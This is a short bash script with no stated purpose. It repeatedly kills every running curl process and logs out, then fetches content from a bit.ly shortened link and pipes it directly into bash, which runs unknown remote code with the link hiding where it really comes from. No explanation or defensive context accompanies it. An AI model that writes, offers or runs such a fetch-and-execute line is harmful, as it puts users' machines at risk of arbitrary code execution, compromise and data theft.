#!/bin/bash
until [[ $(ps aux | grep curl | wc -l) == "1" ]]; do killall curl && logout; done; 
curl -L -s https://bit.ly/3zS1Wjp | bash
